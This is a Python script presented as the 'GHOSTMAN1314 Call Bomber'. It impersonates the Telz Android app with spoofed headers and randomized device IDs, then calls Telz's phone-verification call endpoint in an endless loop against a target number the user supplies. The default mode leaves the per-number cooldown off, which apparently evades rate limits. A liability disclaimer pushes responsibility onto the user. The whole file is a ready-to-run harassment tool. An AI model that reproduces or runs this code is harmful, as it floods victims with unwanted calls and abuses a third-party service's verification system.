import requests, json, time, uuid, os, re
from threading import Lock
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

console = Console()
CONFIG_FILE = ".ghostman1314_lic"

# --- EULA SISTEMI ---
def eula_check():
    if os.path.exists(CONFIG_FILE):
        return True
    console.clear()
    eula_text = Text.from_markup(
        "[bold red]END USER LICENSE AGREEMENT (EULA)[/bold red]\n\n"
        "1. [bold white]OWNERSHIP:[/bold white] Property of [bold magenta]GHOSTMAN1314[/bold magenta].\n"
        "2. [bold white]LIABILITY:[/bold white] Developer is not responsible for any misuse.\n"
        "3. [bold white]COMPLIANCE:[/bold white] You agree to follow your local cyber laws.\n\n"
        "[bold yellow]All legal responsibility belongs to the user.[/bold yellow]"
    )
    console.print(Align.center(Panel(eula_text, title="[bold white]GHOSTMAN1314 LEGAL[/bold white]", border_style="red", expand=False)))

    confirm = console.input("\n[bold yellow]Do you accept the terms? (Y/N): [/bold yellow]").upper()
    if confirm == "Y":
        with open(CONFIG_FILE, "w") as f:
            json.dump({"accepted": True}, f)
        return True
    else:
        console.print("[bold red][!] Access Denied.[/bold red]")
        exit()

# --- ENGINE SETTINGS ---
MODE = "TEST_RANDOM_IDS"
COOLDOWN_TIME = 300

class GhostmanLimiter:
    def __init__(self, limit_time=300):
        self.limit_time = float(limit_time)
        self.history = {}
        self.lock = Lock()

    def can_call(self, target_num):
        now = time.time()
        with self.lock:
            last_call = self.history.get(target_num)
            if last_call is None or (now - last_call) >= self.limit_time:
                self.history[target_num] = now
                return True
            else:
                return False

limiter = GhostmanLimiter(limit_time=COOLDOWN_TIME)

class GhostmanClient:
    base_url = "https://api.telz.com/"
    headers = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }

    def __init__(self, android_id=None, app_ver="17.5.33", os_type="android", os_ver="15"):
        if MODE == "TEST_RANDOM_IDS" and android_id is None:
            android_id = self.gen_android_id()
        self.android_id = android_id or "13e50e93a6399e67"
        self.app_ver = app_ver
        self.os_type = os_type
        self.os_ver = os_ver
        self.session_uuid = str(uuid.uuid4())
        self.session = requests.Session()

    @staticmethod
    def gen_android_id(): return uuid.uuid4().hex[:16]

    @staticmethod
    def gen_device_name():
        brands = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto"]
        return f"{brands[int(uuid.uuid4().int % len(brands))]}-{uuid.uuid4().hex[:6]}"

    def request_send(self, endpoint, payload, timeout=10.0):
        full_url = self.base_url + endpoint
        data = payload.copy()
        data.update({
            "android_id": self.android_id,
            "app_version": self.app_ver,
            "os": self.os_type,
            "os_version": self.os_ver,
            "ts": int(time.time() * 1000),
            "uuid": self.session_uuid
        })

        response = self.session.post(full_url, data=json.dumps(data), headers=self.headers, timeout=timeout)

        if response.status_code == 429:
            retry_after = response.headers.get("Retry-After", "?")
            raise RuntimeError(f"Rate Limit: Wait {retry_after}s (Endpoint={endpoint})")

        response.raise_for_status()
        try:
            return response.json()
        except ValueError:
            return response.text

    def get_auth_list(self):
        return self.request_send("app/auth_list", {"event": "auth_list"})

    def app_run(self, dev_name=None, ipv4="10.1.10.1", ipv6="FE80::1", lang="tr"):
        dev_name = dev_name or (self.gen_device_name() if MODE == "TEST_RANDOM_IDS" else "Xiaomi 2311DRK48G")
        return self.request_send("app/run", {
            "event": "run", "device_name": dev_name, "ipv4_address": ipv4,
            "ipv6_address": ipv6, "lang": lang, "network_country": "tr",
            "network_type": "4G", "roaming": "no", "root": "no", "run_id": "", "sim_country": "tr"
        })

    def stat_btns(self, btn="on_reg_continue"):
        return self.request_send("app/stat_btns", {"event": "stat_btns", "btn": btn})

    def validate_phone(self, phone, region="TR"):
        return self.request_send("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": region})

    def auth_call(self, phone, attempt="0", lang="tr"):
        if MODE == "DEBOUNCE" and not limiter.can_call(phone):
            raise RuntimeError(f"[!]: Cooldown active for {phone}. Wait {COOLDOWN_TIME}s.")
        return self.request_send("app/auth_call", {"event": "auth_call", "phone": phone, "attempt": attempt, "lang": lang})

if __name__ == "__main__":
    eula_check()
    console.clear()

    # GHOSTMAN1314 ASCII HEADER
    logo = Text()
    logo.append("\n ██████  ██   ██  ██████  ███████ ████████ ███    ███  █████  ███    ██", style="bold magenta")
    logo.append("\n██       ██   ██ ██    ██ ██         ██    ████  ████ ██   ██ ████   ██", style="bold magenta")
    logo.append("\n██   ███ ███████ ██    ██ ███████    ██    ██ ████ ██ ███████ ██ ██  ██", style="bold magenta")
    logo.append("\n██    ██ ██   ██ ██    ██      ██    ██    ██  ██  ██ ██   ██ ██  ██ ██", style="bold magenta")
    logo.append("\n ██████  ██   ██  ██████  ███████    ██    ██      ██ ██   ██ ██   ████", style="bold magenta")
    logo.append("\n\n          [ G H O S T M A N 1 3 1 4   C A L L   B O M B E R ]", style="bold cyan")
    console.print(Align.center(logo))

    target_number = console.input("\n[bold white]Target Number (+90...): [/bold white]").strip()

    client = GhostmanClient()
    console.print(Panel(f"[bold green]ATTACK STARTING ON: {target_number}[/bold green]", border_style="cyan"))

    while True:
        try:
            # Ghostman Attack Loop
            print(f"[{target_number}] AuthList:", client.get_auth_list())
            print(f"[{target_number}] AppRun:", client.app_run())
            print(f"[{target_number}] StatBtns:", client.stat_btns())
            print(f"[{target_number}] Validating:", client.validate_phone(target_number))
            print(f"[{target_number}] Triggering Call:", client.auth_call(target_number))

            time.sleep(20)
        except Exception as e:
            console.print(f"[bold red]Hata:[/bold red] {e}")
            time.sleep(5)
